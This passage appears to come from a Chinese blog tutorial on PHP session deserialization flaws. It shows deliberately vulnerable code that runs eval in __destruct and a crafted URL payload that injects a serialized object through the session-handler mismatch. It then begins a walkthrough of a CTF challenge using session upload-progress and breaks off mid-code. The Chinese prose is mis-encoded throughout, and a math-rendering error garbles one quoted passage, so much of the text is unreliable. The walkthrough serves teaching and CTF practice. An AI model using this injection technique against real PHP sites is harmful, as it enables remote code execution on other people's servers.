<h4 id="php_binaryå¤„ç†å™¨"><a class="markdownIt-Anchor" href="#php_binaryå¤„ç†å™¨"></a> php_binaryå¤„ç†å™¨</h4>
<p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># ä¸ºäº†æ–¹ä¾¿ACSIIæ˜¾ç¤ºï¼Œå°†é”®åè®¾ç½®ä¸º36ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç”±äºä¸‰ç§æ–¹å¼<code>PHPSESSID</code>æ–‡ä»¶åéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œåªéœ€è¦æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988665_622b0d79304714550f427-166727395787421.jpeg" alt="img"></p>
<table>
<thead>
<tr>
<th style="text-align:center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦</th>
<th style="text-align:center">é”®å</th>
<th style="text-align:center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">namenamenamenamenamenamenamenamename</td>
<td style="text-align:center">s:6:â€œhardenâ€;</td>
</tr>
</tbody>
</table>
<h4 id="php_serialize-å¤„ç†å™¨"><a class="markdownIt-Anchor" href="#php_serialize-å¤„ç†å™¨"></a> php_serialize å¤„ç†å™¨</h4>
<p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ–‡ä»¶å†…å®¹å³ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ï¼Œ<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988666_622b0d7a2a04733d2da9c-166727395787422.jpeg" alt="img"></p>
<h4 id="sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"><a class="markdownIt-Anchor" href="#sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"></a> sessionçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h4>
<p>sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨<code>php</code>å¤„ç†å™¨å’Œ<code>php_serialize</code>å¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿï¼Œé€šè¿‡å…·ä½“çš„ä»£ç æˆ‘ä»¬æ¥çœ‹ä¸‹æ¼æ´å‡ºç°çš„åŸå› </p>
<h4 id="æ¼æ´æˆå› "><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› "></a> æ¼æ´æˆå› </h4>
<p>é¦–å…ˆåˆ›å»º<code>session.php</code>ï¼Œä½¿ç”¨<code>php_serialize</code>å¤„ç†å™¨æ¥å­˜å‚¨sessionæ•°æ®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>test.php</code>ï¼Œä½¿ç”¨é»˜è®¤<code>php</code>å¤„ç†å™¨æ¥å­˜å‚¨sessionæ•°æ®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">f4ke</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> <span class="title function_ invoke__">f4ke</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ç€ï¼Œæˆ‘ä»¬æ„å»ºURLè¿›è¡Œè®¿é—®<code>session.php</code>ï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://www.session-serialize.com/session.php?session=|O:<span class="number">4</span>:<span class="string">&quot;f4ke&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988667_622b0d7b189aa37924788-166727395787423.jpeg" alt="img"></p>
<p>æ‰“å¼€<code>PHPSESSID</code>æ–‡ä»¶å¯çœ‹åˆ°åºåˆ—åŒ–å­˜å‚¨çš„å†…å®¹</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">45</span>:<span class="string">&quot;|O:4:&quot;</span>f4ke<span class="string">&quot;:1:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:10:&quot;</span><span class="built_in">phpinfo</span>();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988668_622b0d7c24506b56b24cc-166727395787424.jpeg" alt="img"></p>
<p>æ¼æ´åˆ†æï¼š</p>
<blockquote>
<p>åœ¨<code>session.php</code>ç¨‹åºæ‰§è¡Œï¼Œæˆ‘ä»¬å°†<code>|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>é€šè¿‡<code>php_serialize</code>å¤„ç†å™¨åºåˆ—åŒ–ä¿å­˜æˆ<code>PHPSESSID</code>æ–‡ä»¶ï¼›</p>
<p>ç”±äºæµè§ˆå™¨ä¸­ä¿å­˜çš„<code>PHPSESSID</code>æ–‡ä»¶åä¸å˜ï¼Œå½“æˆ‘ä»¬è®¿é—®<code>test.php</code>ï¼Œ<code>session_start();</code>æ‰¾åˆ°<code>PHPSESSID</code>æ–‡ä»¶å¹¶ä½¿ç”¨<code>php</code>å¤„ç†å™¨ååºåˆ—åŒ–æ–‡ä»¶å†…å®¹ï¼Œè¯†åˆ«æ ¼å¼å³</p>
<table>
<thead>
<tr>
<th style="text-align:center">é”®å</th>
<th style="text-align:center">ç«–çº¿</th>
<th style="text-align:center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:1:{s:7:â€œsessionâ€;s:45:&quot;</td>
<td style="text-align:center">|</td>
<td style="text-align:center">O:4:â€œf4keâ€:1:{s:4:â€œnameâ€;s:10:â€œphpinfo();â€;}</td>
</tr>
</tbody>
</table>
<p>phpå¤„ç†å™¨ä¼šä»¥|ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå°†<code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>ååºåˆ—åŒ–ï¼Œå°±ä¼šè§¦å‘<code>__wakeup()</code>æ–¹æ³•ï¼Œæœ€åå¯¹è±¡é”€æ¯æ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ä¸­çš„<code>eval()</code>å‡½æ•°ï¼Œç›¸å½“äºæ‰§è¡Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="keyword">new</span> <span class="title function_ invoke__">f4ke</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>]-&gt;name = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æˆ‘ä»¬è®¿é—®<code>test.php</code>ï¼Œå³å¯ç›´æ¥æ‰§è¡Œ<code>phpinfo()</code>å‡½æ•°</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988669_622b0d7d70e697142e89d-166727395787425.jpeg" alt="img"></p>
<h4 id="ctfä¾‹é¢˜phpinfo"><a class="markdownIt-Anchor" href="#ctfä¾‹é¢˜phpinfo"></a> CTFä¾‹é¢˜ï¼šPHPINFO</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é¢˜ç›®åœ°å€ï¼šhttp:<span class="comment">//web.jarvisoj.com:32784/index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>ini_set('session.serialize_handler', 'php')</code>ï¼Œåˆ¤æ–­å¯èƒ½å­˜åœ¨sessionååºåˆ—åŒ–æ¼æ´ï¼Œæ ¹æ®ä»£ç é€»è¾‘ï¼Œè®¿é—®URLåŠ ä¸Š<code>phpinfo</code>å‚æ•°æ–°å»ºå¯¹è±¡è§¦å‘é­”æœ¯æ–¹æ³•æ‰§è¡Œ<code>phpinfo()</code>å‡½æ•°ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹<code>session.serialize_handler</code>é…ç½®</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988670_622b0d7ecd9a84139855d-166727395787426.jpeg" alt="img"></p>
<p>å¯è§<code>php.ini</code>ä¸­<code>session.serialize_handler = php_serialize</code>ï¼Œå½“å‰ç›®å½•ä¸­è¢«è®¾ç½®ä¸º<code>session.serialize_handler = php</code>ï¼Œå› æ­¤å­˜åœ¨sessionååºåˆ—åŒ–åˆ©ç”¨çš„æ¡ä»¶</p>
<p>è¡¥å……çŸ¥è¯†</p>
<blockquote>
<p>phpinfoæ–‡ä»¶ä¸­</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">local value(å±€éƒ¨å˜é‡ï¼šä½œç”¨äºå½“å‰ç›®å½•ç¨‹åºï¼Œä¼šè¦†ç›–<span class="keyword">master</span> <span class="title">value</span>å†…å®¹):php</span><br><span class="line"><span class="keyword">master</span> <span class="title">value</span>(ä¸»å˜é‡ï¼šphp.inié‡Œé¢çš„å†…å®¹):php_serialize</span><br></pre></td></tr></table></figure>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°ä»£ç å…¥å£å°†åˆ©ç”¨ä»£ç å†™å…¥åˆ°<code>session</code>æ–‡ä»¶ï¼Ÿæƒ³è¦å†™å…¥<code>session</code>æ–‡ä»¶å°±å¾—æƒ³åŠæ³•åœ¨<code>$_SESSION</code>å˜é‡ä¸­å¢åŠ æˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹</p>
<p>è¡¥å……çŸ¥è¯†</p>
<blockquote>
<p><strong>Session ä¸Šä¼ è¿›åº¦</strong>(æ­¤ç‰¹æ€§è‡ª PHP 5.4.0 åå¯ç”¨)</p>
<p>å½“ <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a>INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€</p>
<p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>w</mi><mi>w</mi><mi>w</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>a</mi><mi>n</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>z</mi><mi>h</mi><mi mathvariant="normal">/</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo stretchy="false">)</mo><mtext>ä¸­è·å¾—ã€‚å½“</mtext><mi>P</mi><mi>H</mi><mi>P</mi><mtext>æ£€æµ‹åˆ°è¿™ç§</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨</mtext><mi mathvariant="normal">â€˜</mi></mrow><annotation encoding="application/x-tex">_SESSION](https://www.php.net/manual/zh/reserved.variables.session.php)ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">h</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">ä¸­</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">ã€‚</span><span class="mord cjk_fallback">å½“</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">æ£€</span><span class="mord cjk_fallback">æµ‹</span><span class="mord cjk_fallback">åˆ°</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">ç§</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">è¯·</span><span class="mord cjk_fallback">æ±‚</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å®ƒ</span><span class="mord cjk_fallback">ä¼š</span><span class="mord cjk_fallback">åœ¨</span><span class="mord">â€˜</span></span></span></span>_SESSION`ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>ä¸ <a href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p>
</blockquote>
<p>ç¿»è¯‘æˆäººè¯å°±æ˜¯ï¼Œå½“æ£€æµ‹Session ä¸Šä¼ è¿›åº¦è¿™ä¸€ç‰¹æ€§æ˜¯å¼€å¯çŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å®¢æˆ·ç«¯å†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ–‡ä»¶ä¸Šä¼ çš„åŒæ—¶ï¼Œ<code>POST</code>ä¸€ä¸ªä¸<code>php.ini</code>ä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡<code>PHP_SESSION_UPLOAD_PROGRESS</code>ï¼Œå¦‚ä¸‹å›¾ï¼Œå³å¯å†™å…¥<code>$_SESSION</code>ï¼Œè¿›ä¸€æ­¥åºåˆ—åŒ–å†™å…¥<code>session</code>æ–‡ä»¶</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988672_622b0d80327a70a064145-166727395787427.jpeg" alt="img"></p>
<p>ä¸‹é¢æ˜¯å®˜æ–¹ç»™å‡ºçš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹è¿›åº¦ä¾‹å­:</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;</span></span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.upload_progress.name&quot;</span>); <span class="meta">?&gt;</span></span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>name=&quot;&quot;</code>ä¹Ÿå¯ä»¥è®¾ç½®ä¸º<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></p>
<p>åœ¨sessionä¸­å­˜å‚¨çš„ä¸Šä¼ è¿›åº¦ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_SESSION[<span class="string">&quot;upload_progress_123&quot;</span>] = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time  è¯·æ±‚æ—¶é—´</span></span><br><span class="line"> <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length é•¿åº¦</span></span><br><span class="line"> <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed å·²æ¥æ”¶å­—èŠ‚</span></span><br><span class="line"> <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not æ˜¯å¦ä¸Šä¼ å®Œæˆ</span></span><br><span class="line"> <span class="string">&quot;files&quot;</span> =&gt; <span class="keyword">array</span>(<span class="comment">//ä¸Šä¼ çš„æ–‡ä»¶</span></span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file1&quot;</span>,       <span class="comment">// Name of the &lt;input/&gt; field  inputä¸­è®¾å®šçš„å˜é‡å</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES             </span></span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;foo.avi&quot;</span>,           <span class="comment">//æ–‡ä»¶å</span></span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; <span class="string">&quot;/tmp/phpxxxxxx&quot;</span>,</span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;field_name&quot;</span> =&gt; <span class="string">&quot;file2&quot;</span>,</span><br><span class="line">   <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;bar.avi&quot;</span>,</span><br><span class="line">   <span class="string">&quot;tmp_name&quot;</span> =&gt; NULL,</span><br><span class="line">   <span class="string">&quot;error&quot;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">&quot;done&quot;</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">   <span class="string">&quot;start_time&quot;</span> =&gt; 